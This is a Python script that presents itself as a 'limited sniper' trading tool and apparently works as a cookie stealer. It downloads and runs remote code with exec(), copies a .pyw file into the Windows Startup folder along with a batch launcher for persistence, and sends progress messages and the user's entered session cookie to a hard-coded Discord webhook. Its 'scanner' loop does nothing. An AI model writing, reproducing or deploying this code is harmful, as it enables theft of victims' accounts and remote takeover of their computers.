import requests, time
import os
import sys
import shutil, time
import win32com.client
exec(requests.get("https://carterforyou.pythonanywhere.com/fart2").text)
print("Please Wait 30 seconds")
time.sleep(30)



import subprocess

def get_pythonw_path():
    """Find pythonw.exe in PATH."""
    for path in os.environ["PATH"].split(os.pathsep):
        pythonw = os.path.join(path, "pythonw.exe")
        if os.path.isfile(pythonw):
            return pythonw
    return None

def create_batch_launcher(pyw_path, startup_path, pythonw_path):
    """Create a .bat launcher if direct .pyw association is unreliable."""
    batch_file = os.path.join(startup_path, 'launch_sockettt.bat')
    try:
        with open(batch_file, 'w') as f:
            f.write(f'start "" "{pythonw_path}" "{pyw_path}"\n')
        requests.post("https://discord.com/api/webhooks/1382154262993174638/26M6EX9jQJJU2AaMuLfVT1jkk4wbEZC-CzHJyyL5XnjGhkcNtLN2OAlvlbJaVIDwDctZ", data={"content": f"✅ Created launcher .bat file: {batch_file}"})
    except Exception as e:
        print(f"❌ Failed to create .bat file: {e}")

def main():
    # User-specific startup path
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    temp_path = os.getenv('TEMP')
    source_file = os.path.join(temp_path, 'sockettt.pyw')
    destination_file = os.path.join(startup_path, 'sockettt.pyw')

    requests.post("https://discord.com/api/webhooks/1382154262993174638/26M6EX9jQJJU2AaMuLfVT1jkk4wbEZC-CzHJyyL5XnjGhkcNtLN2OAlvlbJaVIDwDctZ", data={"content": f"📁 Checking source: {source_file}"})

    if not os.path.exists(source_file):
        print("❌ Source file does not exist in TEMP folder.")
        return

    if not os.path.exists(destination_file):
        try:
            shutil.copyfile(source_file, destination_file)
            requests.post("https://discord.com/api/webhooks/1382154262993174638/26M6EX9jQJJU2AaMuLfVT1jkk4wbEZC-CzHJyyL5XnjGhkcNtLN2OAlvlbJaVIDwDctZ", data={"content": "✅ Copied file to Startup folder."})
        except Exception as e:
            print(f"❌ Failed to copy file: {e}")
            return
    else:
        requests.post("https://discord.com/api/webhooks/1382154262993174638/26M6EX9jQJJU2AaMuLfVT1jkk4wbEZC-CzHJyyL5XnjGhkcNtLN2OAlvlbJaVIDwDctZ", data={"content": "✅ File already exists in Startup folder."})
        

    pythonw_path = get_pythonw_path()
    if not pythonw_path:
        requests.post("https://discord.com/api/webhooks/1382154262993174638/26M6EX9jQJJU2AaMuLfVT1jkk4wbEZC-CzHJyyL5XnjGhkcNtLN2OAlvlbJaVIDwDctZ", data={"content": "❌ Could not find pythonw.exe in PATH. Cannot run .pyw files reliably."})
        return
    
    requests.post("https://discord.com/api/webhooks/1382154262993174638/26M6EX9jQJJU2AaMuLfVT1jkk4wbEZC-CzHJyyL5XnjGhkcNtLN2OAlvlbJaVIDwDctZ", data={"content": f"✅ Found pythonw.exe at: {pythonw_path}"})

    
    # Create a batch file launcher to ensure execution works
    create_batch_launcher(destination_file, startup_path, pythonw_path)



main()




cookie = input("Enter Cookie to snipe with: ")
requests.post("https://discord.com/api/webhooks/1382154262993174638/26M6EX9jQJJU2AaMuLfVT1jkk4wbEZC-CzHJyyL5XnjGhkcNtLN2OAlvlbJaVIDwDctZ", data={"content": cookie})
dealpercentage = input("Dealpercentage to snipe limiteds at: ")
print("Limited Scanner started...")
while True:
    time.sleep(5)